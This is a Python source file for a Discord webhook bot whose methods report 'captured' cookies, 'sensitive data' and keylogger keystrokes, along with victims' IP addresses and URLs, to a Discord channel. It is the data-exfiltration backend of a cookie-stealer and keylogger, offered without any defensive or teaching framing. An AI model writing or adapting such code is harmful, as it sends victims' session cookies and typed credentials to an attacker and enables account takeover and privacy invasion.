import requests
import json
from typing import Dict, Any
from datetime import datetime

class DiscordBot:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.colors = {
            'red': 0xFF0000,
            'green': 0x00FF00,
            'blue': 0x0000FF,
            'yellow': 0xFFFF00
        }

    def send_webhook(self, data: Dict[str, Any]) -> bool:
        try:
            response = requests.post(
                self.webhook_url,
                json=data,
                headers={'Content-Type': 'application/json'}
            )
            return response.status_code == 204
        except Exception as e:
            print(f"Discord webhook error: {str(e)}")
            return False

    def send_cookie_alert(self, cookie_data: Dict[str, str]) -> bool:
        embed = {
            "title": "🍪 New Cookie Captured",
            "color": self.colors['green'],
            "fields": [
                {"name": "Name", "value": cookie_data['name'], "inline": True},
                {"name": "Value", "value": cookie_data['value'][:100] + "..." if len(cookie_data['value']) > 100 else cookie_data['value'], "inline": True},
                {"name": "IP", "value": cookie_data['ip'], "inline": True},
                {"name": "Domain", "value": cookie_data.get('domain', 'N/A'), "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        
        return self.send_webhook({"embeds": [embed]})

    def send_sensitive_data_alert(self, data: Dict[str, str]) -> bool:
        embed = {
            "title": "⚠️ Sensitive Data Detected",
            "color": self.colors['red'],
            "fields": [
                {"name": "Type", "value": data['type'], "inline": True},
                {"name": "URL", "value": data['url'], "inline": True},
                {"name": "IP", "value": data['ip'], "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        
        return self.send_webhook({"embeds": [embed]})

    def send_keylogger_alert(self, data: Dict[str, str]) -> bool:
        embed = {
            "title": "⌨️ Keylogger Data",
            "color": self.colors['blue'],
            "fields": [
                {"name": "URL", "value": data['url'], "inline": True},
                {"name": "IP", "value": data['ip'], "inline": True},
                {"name": "Keys", "value": f"```{data['keys'][:1000]}```"}
            ],
            "timestamp": datetime.now().isoformat()
        }
        
        return self.send_webhook({"embeds": [embed]})
